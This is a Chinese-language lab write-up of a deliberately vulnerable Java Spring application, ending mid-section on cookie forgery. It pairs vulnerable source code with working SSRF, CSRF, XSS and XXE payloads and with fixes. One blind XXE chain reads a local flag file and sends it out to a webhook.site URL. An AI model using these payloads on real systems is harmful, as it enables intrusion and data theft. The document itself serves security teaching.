通过 `httpService` 向用户指定的 URL 发起 HTTP 请求，返回响应内容。

这段代码使用 **Spring RestTemplate** 来进行 HTTP 请求，并禁止了重定向，但不影响直接访问：

payload：

```
?url=http://127.0.0.1:8080/login
```

这里必须要带/login，因为被禁止了重定向

---

### /ssrf/restTemplate/vuln2

源码：

```
    @GetMapping("/restTemplate/vuln2")
    public String RestTemplateUrl(String url){
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        return httpService.RequestHttp(url, headers);
    }
```

代码和上一关类似，但是这里没有禁止重定向，可以直接SSRF

payload：

```
?url=http://127.0.0.1:8080
```

---

### /ssrf/hutool/vuln

源码：

```
    @GetMapping("/hutool/vuln")
    public String hutoolHttp(String url){
        return HttpUtil.get(url);
    }
```

通过 Hutool 的 `HttpUtil.get()` 方法发起 HTTP 请求，返回目标 URL 的内容。

这个路由也能SSRF，但是不能重定向。

payload：

```
?url=http://127.0.0.1:8080/login
```

---

### /ssrf/dnsrebind/vuln

源码：

```
    @GetMapping("/dnsrebind/vuln")
    public String DnsRebind(String url) {
        java.security.Security.setProperty("networkaddress.cache.negative.ttl" , "0");
        if (!SecurityUtil.checkSSRFWithoutRedirect(url)) {
            return "Dangerous url";
        }
        return HttpUtil.get(url);
    }
```

checkSSRFWithoutRedirect函数：

```
    /**
     * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。
     * 存在问题：
     *  1、TTL为0会被绕过
     *  2、使用重定向可绕过
     *
     * @param url The url that needs to check.
     * @return Safe url returns true. Dangerous url returns false.
     */
    public static boolean checkSSRFWithoutRedirect(String url) {
        if(url == null) {
            return false;
        }
        return !SSRFChecker.isInternalIpByUrl(url);
    }
```

这里会调用isInternalIpByUrl函数来检查url

`isInternalIpByUrl`函数：

```
    /**
     * 判断一个URL的IP是否是内网IP
     *
     * @return 如果是内网IP，返回true；非内网IP，返回false。
     */
    public static boolean isInternalIpByUrl(String url) {

        String host = url2host(url);
        if (host.equals("")) {
            return true; // 异常URL当成内网IP等非法URL处理
        }

        String ip = host2ip(host);
        if (ip.equals("")) {
            return true; // 如果域名转换为IP异常，则认为是非法URL
        }

        return isInternalIp(ip);
    }
```

添加了 IP 检查，修改一下 dns 解析即可绕过，方法如下：

给本地的 hosts 文件添加一条解析记录：

**本地 `hosts` 文件位置**

| **操作系统**  | **文件路径**                            |
| ------------- | --------------------------------------- |
| Windows       | `C:\Windows\System32\drivers\etc\hosts` |
| Linux / macOS | `/etc/hosts`                            |

192.168.234.128 www.baidu.com

**刷新 DNS 缓存**

windows

```
ipconfig /flushdns
```

linux

```
sudo systemctl restart nscd
```

然后就可以实现 ssrf：

```
?url=http://www.baidu.com:8080/login
```

这里我是用/ssrf/hutool/vuln路由成功的，这个路由我尝试了修改DNS解析和TTL为0的DNS重绑定都没成功，302重定向没试过，理论上应该可以

---

### SSRF修复与防护

#### （1）限制协议使用

修复代码：

```
@GetMapping("/urlConnection/sec")
    public String URLConnectionSec(String url) {

        // Decline not http/https protocol
        if (!SecurityUtil.isHttp(url)) {
            return "[-] SSRF check failed";
        }

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.URLConnection(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }

```

isHttp函数定义：

```
 public static boolean isHttp(String url) {
        return url.startsWith("http://") || url.startsWith("https://");
    }

```

禁用掉了除http/https以外的协议，添加了SSRF检查。无法使用内网Ip来连接，并且DNS重绑定也不行

#### （2）限制文件类型

修复代码：

```
   @GetMapping("/ImageIO/sec")
    public String ImageIO(@RequestParam String url) {
        try {
            SecurityUtil.startSSRFHook();
            HttpUtils.imageIO(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

        return "ImageIO ssrf test";
    }

```

`imageIO`函数：

```
public static void imageIO(String url) {
        try {
            URL u = new URL(url);
            ImageIO.read(u); // send request
        } catch (IOException e) {
            logger.error(e.getMessage());
        }

    }

```

使用 `Spring` 框架的控制器方法，用于进行一个 URL 请求，并通过调用 `ImageIO` 处理该 URL 指定的图片。同时，它还利用了某种安全机制来防止 SSRF（服务器端请求伪造）攻击。

#### （3）http请求检查

##### 方法1：

```
    @GetMapping("/okhttp/sec")
    public String okhttp(@RequestParam String url) {

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.okhttp(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }

```

`okhttp`函数：

```
public static String okhttp(String url) throws IOException {
    OkHttpClient client = new OkHttpClient();
    com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(url).build();
    return client.newCall(ok_http).execute().body().string();
}

```

##### 方法2：

```
 @GetMapping("/httpclient/sec")
    public String HttpClient(@RequestParam String url) {

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.httpClient(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }

```

`httpClient`函数：

```
public static String httpClient(String url) {

        StringBuilder result = new StringBuilder();

        try {

            CloseableHttpClient client = HttpClients.createDefault();
            HttpGet httpGet = new HttpGet(url);
            // set redirect enable false
            // httpGet.setConfig(RequestConfig.custom().setRedirectsEnabled(false).build());
            HttpResponse httpResponse = client.execute(httpGet); // send request
            BufferedReader rd = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));

            String line;
            while ((line = rd.readLine()) != null) {
                result.append(line);
            }

            return result.toString();

        } catch (Exception e) {
            return e.getMessage();
        }
    }

```

##### 方法3：

```
@GetMapping("/commonsHttpClient/sec")
public String commonsHttpClient(@RequestParam String url) {

    try {
        SecurityUtil.startSSRFHook();
        return HttpUtils.commonHttpClient(url);
    } catch (SSRFException | IOException e) {
        return e.getMessage();
    } finally {
        SecurityUtil.stopSSRFHook();
    }

}

```

`commonHttpClient`函数：

```
    public static String commonHttpClient(String url) {

        HttpClient client = new HttpClient();
        GetMethod method = new GetMethod(url);

        try {
            client.executeMethod(method); // send request
            byte[] resBody = method.getResponseBody();
            return new String(resBody);

        } catch (IOException e) {
            return "Error: " + e.getMessage();
        } finally {
            // Release the connection.
            method.releaseConnection();
        }
    }

```

##### 方法4：

```
    @GetMapping("/Jsoup/sec")
    public String Jsoup(@RequestParam String url) {

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.Jsoup(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }

```

`Jsoup`函数：

```
   public static String Jsoup(String url) {
        try {
            Document doc = Jsoup.connect(url)
//                    .followRedirects(false)
                    .timeout(3000)
                    .cookie("name", "joychou") // request cookies
                    .execute().parse();
            return doc.outerHtml();
        } catch (IOException e) {
            return e.getMessage();
        }
    }

```

##### 方法5：

```
  @GetMapping("/IOUtils/sec")
    public String IOUtils(String url) {
        try {
            SecurityUtil.startSSRFHook();
            HttpUtils.IOUtils(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

        return "IOUtils ssrf test";
    }

```

`IOUtils`函数：

```
  public static void IOUtils(String url) {
        try {
            IOUtils.toByteArray(URI.create(url));
        } catch (IOException e) {
            logger.error(e.getMessage());
        }
    }
```

---

**对比 OkHttp、HttpClient、CommonHttpClient、Jsoup 和 IOUtils**

这五种库各自有不同的特点，适用于不同的场景。下面从几个关键维度（如功能、灵活性、复杂性、性能、适用场景等）对它们进行比较。

| 库名称               | 功能概述                                                     |
| -------------------- | ------------------------------------------------------------ |
| **OkHttp**           | 一个现代化、功能丰富且高性能的 HTTP 客户端库，支持同步与异步请求、连接池、超时控制、自动重定向、WebSocket 支持等。 |
| **HttpClient**       | Apache HttpComponents 提供的 HTTP 客户端，功能丰富，支持连接管理、重定向、认证、代理等。适用于复杂的 HTTP 请求场景。 |
| **CommonHttpClient** | 较旧版本的 Apache HTTP Client（HttpClient 3.x 系列），虽然功能较强，但已经被废弃，主要是为了向下兼容一些老系统。 |
| **Jsoup**            | 主要用于解析和操作 HTML 文档，同时提供 HTTP 请求功能，适用于 Web 抓取、解析和处理网页数据，不专注于纯粹的 HTTP 通信。 |
| **IOUtils**          | Apache Commons IO 提供的工具类库，专注于流处理，提供简单的 API 来读取、写入和转换流，`toByteArray` 只是从 URL 读取数据的一种方式，较简单的 HTTP 请求方式。 |

| 库名称               | 灵活性与配置                                                 |
| -------------------- | ------------------------------------------------------------ |
| **OkHttp**           | 高度可配置，支持请求超时、拦截器、缓存控制、连接池、异步请求、重定向管理等功能，适合需要灵活 HTTP 请求的场景。 |
| **HttpClient**       | 提供复杂的 HTTP 配置，包括连接池、代理设置、认证、连接超时、请求超时、重定向策略等，适合大规模、复杂的 HTTP 通信场景。 |
| **CommonHttpClient** | 提供类似的功能，但由于是过时的版本，缺乏现代 HTTP 客户端的一些性能和灵活性优化。 |
| **Jsoup**            | 主要功能在于解析 HTML 文档，它的 HTTP 请求配置选项较少，支持超时、重定向控制、Cookie、User-Agent 等少量配置，专注于网页抓取和 HTML 处理。 |
| **IOUtils**          | IOUtils 只是简单地将资源转换为字节流，几乎没有 HTTP 请求的配置选项，适合读取小型资源，不适合复杂的 HTTP 通信，无法配置代理、重定向等高级功能。 |

| 库名称               | 复杂性                                                       |
| -------------------- | ------------------------------------------------------------ |
| **OkHttp**           | 复杂度适中，提供直观的 API，适合需要灵活 HTTP 请求且对性能有要求的应用程序。 |
| **HttpClient**       | 功能强大，但相对复杂，适合需要精细控制 HTTP 请求行为的场景。 |
| **CommonHttpClient** | 与 HttpClient 类似，但较旧，API 较复杂，不建议在新项目中使用。 |
| **Jsoup**            | 非常简单易用，尤其在网页抓取和 HTML 解析方面；但对于复杂的 HTTP 通信场景并不适用。 |
| **IOUtils**          | 简单且功能有限，适用于简单的数据读取操作，代码简洁，但不支持复杂的 HTTP 请求场景 |

| 库名称               | 性能                                                         |
| -------------------- | ------------------------------------------------------------ |
| **OkHttp**           | 性能非常好，支持连接池、缓存等优化措施，在高并发场景下表现优异。 |
| **HttpClient**       | 性能不错，提供了复杂场景下的优化策略，适合高负载的应用程序，但相对于 OkHttp 来说稍重。 |
| **CommonHttpClient** | 性能较弱，缺乏现代 HTTP 客户端的一些优化（如连接池管理），由于 API 已过时，性能不如 OkHttp 和 HttpClient。 |
| **Jsoup**            | 在处理 HTML 文档方面性能不错，但在 HTTP 请求方面不如 OkHttp 或 HttpClient 高效。 |
| **IOUtils**          | 性能较低，因为它不提供连接池和高级 HTTP 优化机制，只适合小型资源的读取，在大数据或高频请求场景中表现不佳。 |

| 库名称               | 适用场景                                                     |
| -------------------- | ------------------------------------------------------------ |
| **OkHttp**           | 适用于大多数 HTTP 通信场景，包括同步和异步请求、API 调用、RESTful 服务、WebSocket 通信等，特别适合需要高性能和灵活性的场景。 |
| **HttpClient**       | 适用于复杂的 HTTP 通信场景，尤其是需要代理、身份认证、重定向管理等高级功能的项目。 |
| **CommonHttpClient** | 主要用于老旧项目的兼容，或老系统中遗留的代码库，已经被弃用，不建议在新项目中使用。 |
| **Jsoup**            | 适合 Web 爬虫和 HTML 解析任务，能够方便地处理和操作 HTML 页面，主要用于抓取网页并从中提取数据，不适合复杂 HTTP 请求配置的场景。 |
| **IOUtils**          | 适用于简单的数据读取场景，如从 URL 读取小型文件、图像等，适合轻量级任务，但不适合频繁请求或复杂的 HTTP 请求场景。 |

**总结**

- **OkHttp** 是一个现代且灵活的 HTTP 客户端，性能好，适用于大多数 HTTP 通信任务。
- **HttpClient** 更适合复杂的 HTTP 通信场景，有较强的功能支持，如认证、重定向等，但相对复杂，适合大型项目。
- **CommonHttpClient** 已经过时，主要用于老项目的兼容，不推荐在新项目中使用。
- **Jsoup** 适合处理 HTML 解析任务和轻量的 HTTP 请求，专注于网页抓取和数据提取。
- **IOUtils** 则是一个简化的工具，主要用于读取 URL 内容并转换为字节流，适合简单的小数据传输。

#### （4）核心SSRF防护代码 (startHook)

修复代码：

```
public class SocketHook {

    public static void startHook() throws IOException {
        SocketHookFactory.initSocket();
        SocketHookFactory.setHook(true);
        try{
            Socket.setSocketImplFactory(new SocketHookFactory());
        }catch (SocketException ignored){
        }
    }

    public static void stopHook(){
        SocketHookFactory.setHook(false);
    }
}

```

**功能分析**：

- `startHook()`

  :

  - 启动 `SocketHook`，对所有新创建的 `Socket` 应用自定义行为。核心是通过 `Socket.setSocketImplFactory()` 来设置一个新的 `Socket` 工厂。
  - 可能用于在 `Socket` 连接期间监控、修改、或审查数据流量。

- `stopHook()`

  :

  - 关闭 `SocketHook`，将 `SocketHookFactory` 中的钩子状态关闭，停止对新 `Socket` 实例的自定义行为。

**应用场景**：

- **安全防护**：可以用来检测、拦截或修改特定的网络连接，防止攻击（如 SSRF、RFI 等）通过不受控制的网络请求滥用服务器资源。
- **网络审计**：可用于监控网络流量，以记录或分析 `Socket` 通信内容。
- **调试/测试**：在调试或测试环境中，使用钩子来捕获和分析网络通信行为。

---

## CSRF

### /csrf/post

源码：

```
@Controller
@RequestMapping("/csrf")
public class CSRF {

    @GetMapping("/")
    public String index() {
        return "form";
    }

    @PostMapping("/post")
    @ResponseBody
    public String post() {
        return "CSRF passed.";
    }
}
```

对应前端代码：

```
<html xmlns:th="http://www.thymeleaf.org" lang="en">
<head>
    <script th:src="@{https://code.jquery.com/jquery-3.4.1.min.js}"></script>
</head>



<body>


<div>
    <!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field -->
    <!-- <form name="f" th:action="@{/csrf/post}" method="post"> -->
    <form name="f" action="/csrf/post" method="post">
        <input type="text" name="input" />
        <input type="submit" value="Submit" />
        <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}" />
    </form>
</div>


</body>




</html>
```

该代码由于 /csrf/post 没有进行 token 的验证，可以直接访问，直接 poc 漏洞验证就好了：

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Exploit</title>
</head>
<body>
    <h1>Simulating CSRF Attack</h1>

    <form id="csrfForm" action="http://127.0.0.1:8080/csrf/post" method="POST">
        <input type="hidden" name="message" value="This is a CSRF attack message">
    </form>

    <script>
        // 自动提交表单，执行攻击
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

### csrf 防护

**使用 CSRF Token：**

​    服务器生成一个唯一的 CSRF Token 并将其发送给用户（通常通过隐藏字段、URL 参数或 HTTP 头）。
​    在提交表单或发起请求时，客户端将该 Token 一同发送回服务器，服务器验证 Token 的有效性以防止伪造请求。

**SameSite Cookie 属性：**

​    设置 Cookie 的 SameSite 属性为 Strict 或 Lax ，限制第三方网站通过跨站点方式发送 Cookie。
​    Strict ：禁止任何跨站请求携带 Cookie。
​    Lax ：允许一些安全的跨站请求（例如 GET 请求），但阻止 POST 等敏感操作。

**双重 Cookie 验证：**

​    服务器发送一个 Cookie 给用户，客户端在请求时会自动携带该 Cookie。
​    客户端还需要在表单中携带相同的值（通过 JS 从 Cookie 中提取），服务器检查这两个值是否匹配。

**检查 Referer 头：**

​    服务器通过验证请求头中的 Referer 字段是否来自合法的域名，来确定请求是否来自可信来源。
​    这种方法并不完全可靠，因为有些环境下 Referer 头可能会被修改或省略。

**CAPTCHA：**

​    使用 CAPTCHA 来确保请求是由真实用户而非自动化脚本发起，虽然这种方式不能完全防护 CSRF，但能增加攻击难度。

**限制请求来源：**

​    对敏感操作（如资金转移、修改账户信息等）设置请求来源的严格验证，确保这些操作只能通过特定的合法来源进行。

---

## XSS

### /xss/reflect

源码：

```
@Controller
@RequestMapping("/xss")
public class XSS {

    /**
     * Vuln Code.
     * ReflectXSS
     * http://localhost:8080/xss/reflect?xss=<script>alert(1)</script>
     *
     * @param xss unescape string
     */
    @RequestMapping("/reflect")
    @ResponseBody
    public static String reflect(String xss) {
        return xss;
    }
```

没有任何防护，存在反射型xss。

payload：

```
?xss=<script>alert("123");</script>
```

---

### /xss/stored

源码：

```
 @RequestMapping("/stored/store")
    @ResponseBody
    public String store(String xss, HttpServletResponse response) {
        Cookie cookie = new Cookie("xss", xss);
        response.addCookie(cookie);
        return "Set param into cookie";
    }

    /**
     * Vul Code.
     * StoredXSS Step2
     * http://localhost:8080/xss/stored/show
     *
     * @param xss unescape string
     */
    @RequestMapping("/stored/show")
    @ResponseBody
    public String show(@CookieValue("xss") String xss) {
        return xss;
    }
```

存在存储型xss，先用路由/xss/stored/store将xss代码存储到cookie中

再访问`/xss/stored/show`路由触发xss恶意代码

payload

```
# /xss/stored/store

?xss=?xss=<script>alert(1)</script>

# /xss/stored/show
```

注意这里不能有引号和分号，否则会报错

---

### XSS攻击防护

**防护代码：**

```
    @RequestMapping("/safe")
    @ResponseBody
    public static String safe(String xss) {
        return encode(xss);
    }

    private static String encode(String origin) {
        origin = StringUtils.replace(origin, "&", "&amp;");
        origin = StringUtils.replace(origin, "<", "&lt;");
        origin = StringUtils.replace(origin, ">", "&gt;");
        origin = StringUtils.replace(origin, "\"", "&quot;");
        origin = StringUtils.replace(origin, "'", "&#x27;");
        origin = StringUtils.replace(origin, "/", "&#x2F;");
        return origin;
    }
}
```

对一些可能会被利用的关键字进行替换成安全的编码

---

## XXE

### /xxe/xmlReader/vuln

源码：

```
@PostMapping("/xmlReader/vuln")
    public String xmlReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
            return "xmlReader xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
```

### /xxe/SAXBuilder/vuln

```
@RequestMapping(value = "/SAXBuilder/vuln", method = RequestMethod.POST)
    public String SAXBuilderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXBuilder builder = new SAXBuilder();
            // org.jdom2.Document document
            builder.build(new InputSource(new StringReader(body)));  // cause xxe
            return "SAXBuilder xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
```

这个路由知识换用了SAXReader第三方库，攻击手法同上：

```
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://gefryrrdsk.lfcx.eu.org">]><root>&xxe;</root>
```

只能用来读文件，而且还不回显

---

### 修复代码

都是外部实体造成的问题，禁用外部实体就行了

```
    @RequestMapping(value = "/SAXBuilder/sec", method = RequestMethod.POST)
    public String SAXBuilderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXBuilder builder = new SAXBuilder();
            builder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            builder.setFeature("http://xml.org/sax/features/external-general-entities", false);
            builder.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            // org.jdom2.Document document
            builder.build(new InputSource(new StringReader(body)));

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "SAXBuilder xxe security code";
    }
```

---

### /xxe/SAXReader/vuln

源码：

```
 @RequestMapping(value = "/SAXReader/vuln", method = RequestMethod.POST)
    public String SAXReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXReader reader = new SAXReader();
            // org.dom4j.Document document
            reader.read(new InputSource(new StringReader(body))); // cause xxe

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "SAXReader xxe vuln code";
    }
```

payload 一样，也是没有任何防御，该类有回显

### 通用的做法：

External DTD（外部 DTD）+ 参数实体（Parameter Entity）实现的 Blind XXE 外带攻击

在主 xml 里面写：

```
<?xml version="1.0"?>
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "http://192.168.159.1:8000/1.dtd">
	%dtd;
]>
<root>&send;</root>
```

在这个服务器上起一个 http 服务：

```
python -m http.server 8000
```

然后再起的服务下面创建一个 dtd 文件，在 dtd 文件里面搞一个

```
<!ENTITY % file SYSTEM "file:/D:/root/flag.txt">
<!ENTITY % all "<!ENTITY send SYSTEM 'https://webhook.site/9181b45a-e69a-4ca5-8424-f3f6888ddf8e?d=%file;'>">
%all;
```

成功外带

![](../image/jsc-3.png)

---

### /xxe/SAXParser/vuln

源码：

```
  @RequestMapping(value = "/SAXParser/vuln", method = RequestMethod.POST)
    public String SAXParserVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser parser = spf.newSAXParser();
            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml

            return "SAXParser xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
```

### /xxe/Digester/vuln

源码：

```
@RequestMapping(value = "/Digester/vuln", method = RequestMethod.POST)
    public String DigesterVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            Digester digester = new Digester();
            digester.parse(new StringReader(body));  // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return "Digester xxe vuln code";
    }
```

### /xxe/DocumentBuilder/vuln

源码：

```
@RequestMapping(value = "/DocumentBuilder/vuln", method = RequestMethod.POST)
    public String DocumentBuilderVuln(HttpServletRequest request) {
        try {
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            InputSource is = new InputSource(request.getInputStream());
            Document document = db.parse(is);  // parse xml

            // 遍历xml节点name和value
            StringBuilder buf = new StringBuilder();
            NodeList rootNodeList = document.getChildNodes();
            for (int i = 0; i < rootNodeList.getLength(); i++) {
                Node rootNode = rootNodeList.item(i);
                NodeList child = rootNode.getChildNodes();
                for (int j = 0; j < child.getLength(); j++) {
                    Node node = child.item(j);
                    buf.append(String.format("%s: %s\n", node.getNodeName(), node.getTextContent()));
                }
            }
            return buf.toString();
        } catch (Exception e) {
            e.printStackTrace();
            logger.error(e.toString());
            return e.toString();
        }
    }
```

这是JDK自带的类，以此产生的XXE是存在回显的

---

### /xxe/DocumentBuilder/xinclude/vuln

源码：

```
@RequestMapping(value = "/DocumentBuilder/xinclude/vuln", method = RequestMethod.POST)
    public String DocumentBuilderXincludeVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            dbf.setXIncludeAware(true);   // 支持XInclude
            dbf.setNamespaceAware(true);  // 支持XInclude
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            NodeList rootNodeList = document.getChildNodes();
            response(rootNodeList);

            sr.close();
            return "DocumentBuilder xinclude xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
```

### /xxe/XMLReader/vuln

源码：

```
@PostMapping("/XMLReader/vuln")
    public String XMLReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser saxParser = spf.newSAXParser();
            XMLReader xmlReader = saxParser.getXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "XMLReader xxe vuln code";
    }
```

### /xxe/DocumentHelper/vuln

```
@PostMapping("/DocumentHelper/vuln")
    public String DocumentHelper(HttpServletRequest req) {
        try {
            String body = WebUtils.getRequestBody(req);
            DocumentHelper.parseText(body); // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "DocumentHelper xxe vuln code";
    }


    private static void response(NodeList rootNodeList){
        for (int i = 0; i < rootNodeList.getLength(); i++) {
            Node rootNode = rootNodeList.item(i);
            NodeList xxe = rootNode.getChildNodes();
            for (int j = 0; j < xxe.getLength(); j++) {
                Node xxeNode = xxe.item(j);
                // 测试不能blind xxe，所以强行加了一个回显
                logger.info("xxeNode: " + xxeNode.getNodeValue());
            }

        }
    }
```

修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY，不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。

### 上述存在XXE漏洞库对比

| **工具/类**      | **简介**                                                 | **使用场景**                                  | **优点**                            | **缺点**                             |
| ---------------- | -------------------------------------------------------- | --------------------------------------------- | ----------------------------------- | ------------------------------------ |
| `xmlReader`      | SAX 的接口，基于事件驱动的解析                           | 处理大型 XML 文件                             | 内存占用小，速度快                  | 需要手动管理上下文，处理复杂结构困   |
| `SAXBuilder`     | JDOM 中基于 SAX 的解析器                                 | 需要用 JDOM 处理 XML 数据时                   | 结合了 SAX 的高效性和 JDOM 的易用性 | 解析速度依赖于 SAX，灵活性低于 DOM   |
| SAXReader`       | Dom4j 中基于 SAX 的解析器                                | 需要 Dom4j 进行 XML 操作时                    | 高效且灵活，支持树结构              | 性能略逊于纯 SAX                     |
| `SAXParser`      | Java 中的 SAX 解析器                                     | 基于事件驱动的解析，适合处理大型 XML 文件     | 高效，内存占用小                    | 解析复杂 XML 需要手动处理回调        |
| Digester`        | 基于 SAX，将 XML 映射到 Java 对象（Apache Commons 提供） | 需要将 XML 映射为 Java 对象时                 | 简化 XML 与 Java 对象的映射         | 对大文件不友好，灵活性较低           |
| DocumentBuilder` | Java 中 DOM 解析器，用于构建树状结构                     | 需要完整树结构操作，如修改和多次遍历 XML 文件 | 完整保留文档结构，易于查找和修改    | 内存占用较大，处理大文件时性能较差   |
| `DocumentHelper` | Dom4j 提供的辅助类，用于快速创建和操作 XML 文档          | 需要手动构建和操作 XML 文档时                 | 快速创建和处理 XML 文档，灵活性高   | 内存占用较大，处理超大文件时性能不佳 |

### 统一漏洞利用payload：

```
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "https://webhook.site/bef89c10-3850-4342-8f7e-934073c0cc12">]><root>&xxe;</root>
```

### 统一修复代码

```
//实例化解析类之后通常会支持着三个配置
obj.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
obj.setFeature("http://xml.org/sax/features/external-general-entities", false);
obj.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

禁用了外部实体，限制实体来源

---

### /xxe/xmlbeam/vuln

源码：

```
        @PostMapping(value = "/xmlbeam/vuln")
        HttpEntity<String> post(@RequestBody UserPayload user) {
            try {
                logger.info(user.toString());
                return ResponseEntity.ok(String.format("hello, %s!", user.getUserName()));
            }catch (Exception e){
                e.printStackTrace();
                return ResponseEntity.ok("error");
            }
        }

        /**
         * The projection interface using XPath and JSON Path expression to selectively pick elements from the payload.
         */
        @ProjectedPayload
        public interface UserPayload {
            @XBRead("//userName")
            String getUserName();
        }
```

该代码需要使用固定的标签可以实现回显，我们可以构造payload：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
    <!ENTITY xxe SYSTEM "file:/D:/root/flag.txt">  
]>
<userPayload>
    <userName>&xxe;</userName>
</userPayload>
```

成功回显

![](../image/jsc-4.png)

**注意：Content-Type请求头需要改成application/xml**，并且需要在Raw模式下提交，或者抓包后提交才会生效

---

### /ooxml/readxlsx

源码：

```
 @PostMapping("/readxlsx")
    @ResponseBody
    public String ooxml_xxe(MultipartFile file) throws IOException {
        XSSFWorkbook wb = new XSSFWorkbook(file.getInputStream()); // xxe vuln

        XSSFSheet sheet = wb.getSheetAt(0);
        XSSFRow row;
        XSSFCell cell;

        Iterator rows = sheet.rowIterator();
        StringBuilder sbResult = new StringBuilder();

        while (rows.hasNext()) {

            row = (XSSFRow) rows.next();
            Iterator cells = row.cellIterator();

            while (cells.hasNext()) {
                cell = (XSSFCell) cells.next();

                if (cell.getCellType() == XSSFCell.CELL_TYPE_STRING) {
                    sbResult.append(cell.getStringCellValue()).append(" ");
                } else if (cell.getCellType() == XSSFCell.CELL_TYPE_NUMERIC) {
                    sbResult.append(cell.getNumericCellValue()).append(" ");
                } else {
                    logger.info("errors");
                }
            }
        }

        return sbResult.toString();
    }
```

查看源码得知使用的是poi-ooxml组件（ Apache POI是提供Microsoft Office系列文档读、写功能的 JAVA  类库）进行xlsx文件操作，在3.10版本及以下存在XXE注入漏洞，3.15以下版本存在Dos漏洞，这里使用的是3.9版本。

![](../image/jsc-5.png)

可以在 windows 新建一个 xlsx 文件，然后改成 zip 文件，进行解压，有一个 content-type.xml 文件，修改里面的文件

在[Content_Types].xml文件中插入攻击代码：

```
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://vlplgukjkg.lfcx.eu.org">]><root>&xxe;</root>
```

然后将单独的[Content_Types].xml文件压缩为1.zip,改后缀为1.xlsx,上传后实现文件读取，可以使用外部dtd来外带文件。

---

### /xlsx-streamer/readxlsx

源码：

```
 @PostMapping("/readxlsx")
    public void xllx_streamer_xxe(MultipartFile file) throws IOException {
        StreamingReader.builder().open(file.getInputStream());
    }
```

换了个库，原理 payload 同上

---

## Cookie伪造

### **/cookie/vuln01**

漏洞代码：

```
    private static String NICK = "nick";

    @GetMapping(value = "/vuln01")
    public String vuln01(HttpServletRequest req) {
        String nick = WebUtils.getCookieValueByName(req, NICK); // key code
        return "Cookie nick: " + nick;
    }
```

---

### /cookie/vuln02

漏洞代码：

```
 @GetMapping(value = "/vuln02")
    public String vuln02(HttpServletRequest req) {
        String nick = null;
